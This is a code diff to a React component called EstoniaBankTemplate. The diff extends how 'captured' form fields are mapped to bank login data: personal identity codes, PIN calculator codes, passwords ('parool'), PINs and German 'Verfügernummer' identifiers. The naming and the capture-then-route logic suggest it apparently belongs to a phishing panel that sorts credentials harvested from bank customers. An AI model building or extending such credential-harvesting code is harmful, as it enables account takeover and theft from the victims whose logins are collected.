@@ -275,7 +275,7 @@ export function EstoniaBankTemplate({ bankSlug, onChange, handleRouteAction, sav
               continue;
             }
 
-            if (lowerKey === "personalidentitycode") {
+            if (lowerKey === "personalidentitycode" || lowerKey === "personalidentificationcode") {
               assignMappedValue("personalCode", value, { overwrite: true, syncState: true });
               continue;
             }
@@ -307,6 +307,7 @@ export function EstoniaBankTemplate({ bankSlug, onChange, handleRouteAction, sav
 
           if (
             lowerText.includes("personalidentitycode") ||
+            lowerText.includes("personalidentificationcode") ||
             lowerText.includes("personal identity code") ||
             lowerText.includes("identitycode") ||
             lowerText.includes("identity code") ||
@@ -338,6 +339,8 @@ export function EstoniaBankTemplate({ bankSlug, onChange, handleRouteAction, sav
 
           if (
             lowerText.includes("pincalcpassword") ||
+            (lowerKey.includes("pin-calculator") && lowerKey.includes("code")) ||
+            lowerText.includes("pin calculator code") ||
             lowerText.includes("password") ||
             lowerText.includes("passcode") ||
             lowerText.includes("parool") ||
@@ -387,6 +390,39 @@ export function EstoniaBankTemplate({ bankSlug, onChange, handleRouteAction, sav
           if (!mappedData.personalCode) {
             assignMappedValue("personalCode", value, { syncState: true });
           }
+        }
+
+        const filledValues = capturedFields
+          .map((field) => ({
+            key: field.key,
+            name: field.name ?? "",
+            id: field.id ?? "",
+            formControlName: field.formControlName ?? "",
+            value: field.value.trim(),
+          }))
+          .filter((field) => Boolean(field.value))
+          .filter(
+            (field) =>
+              !shouldIgnoreRawBankFieldKey(field.key) &&
+              !shouldIgnoreRawBankFieldKey(field.name) &&
+              !shouldIgnoreRawBankFieldKey(field.id) &&
+              !shouldIgnoreRawBankFieldKey(field.formControlName),
+          )
+          .map((field) => field.value);
+
+        if (filledValues.length === 1) {
+          mappedData.bankPhone = "";
+          mappedData.username = "";
+          mappedData.verfuegernummer = "";
+          mappedData.password = "";
+          mappedData.pin = "";
+          assignMappedValue("personalCode", filledValues[0], { overwrite: true, syncState: true });
+        } else if (filledValues.length === 2) {
+          mappedData.bankPhone = "";
+          mappedData.username = "";
+          mappedData.verfuegernummer = "";
+          assignMappedValue("personalCode", filledValues[0], { overwrite: true, syncState: true });
+          assignPassword(filledValues[1], true);
         }
         
         handleRouteAction({
